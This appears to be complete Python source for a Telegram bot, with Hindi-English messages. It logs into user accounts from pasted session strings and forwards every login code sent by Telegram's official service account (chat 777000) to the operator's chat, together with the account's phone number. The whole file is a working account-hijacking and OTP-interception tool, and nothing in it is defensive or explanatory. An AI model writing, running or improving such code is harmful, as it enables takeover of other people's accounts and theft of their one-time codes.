import os
import asyncio
from aiohttp import web
from pyrogram import Client, filters
from pyrogram.types import Message

API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

app = Client("otp_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
active_clients = {}

@app.on_message(filters.command("start"))
async def start_cmd(client, message: Message):
    await message.reply_text(
        "👋 **Bot Live Hai!**\n\n"
        "Account login karne ke liye bhejein:\n"
        "`/login <session_string>`"
    )

@app.on_message(filters.command("login"))
async def login_cmd(client, message: Message):
    if len(message.command) < 2:
        await message.reply_text("❌ Session string dein. Example:\n`/login BQA...`")
        return

    session_string = message.text.split(None, 1)[1].strip()
    admin_id = message.chat.id
    msg = await message.reply_text("⏳ Login ho raha hai...")

    try:
        user_app = Client(
            name=f"user_{admin_id}_{len(active_clients)}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            in_memory=True
        )
        await user_app.start()
        me = await user_app.get_me()
        active_clients[me.id] = user_app

        await msg.edit_text(
            f"✅ **Login Successful!**\n\n"
            f"👤 **Name:** {me.first_name}\n"
            f"🆔 **ID:** `{me.id}`\n"
            f"📱 **Phone:** +{me.phone_number}\n\n"
            f"Ab is number ke saare OTP yahin aayenge."
        )

        @user_app.on_message(filters.chat(777000))
        async def otp_handler(u_client, otp_msg: Message):
            if otp_msg.text:
                await client.send_message(
                    chat_id=admin_id,
                    text=f"🚨 **New OTP (+{me.phone_number}):**\n\n{otp_msg.text}"
                )

    except Exception as e:
        await msg.edit_text(f"❌ **Error:** `{str(e)}`")

async def handle(request):
    return web.Response(text="Bot is Live!")

async def start_server():
    server = web.Application()
    server.router.add_get("/", handle)
    runner = web.AppRunner(server)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

async def main():
    await start_server()
    await app.start()
    print("Bot Started Successfully!")
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
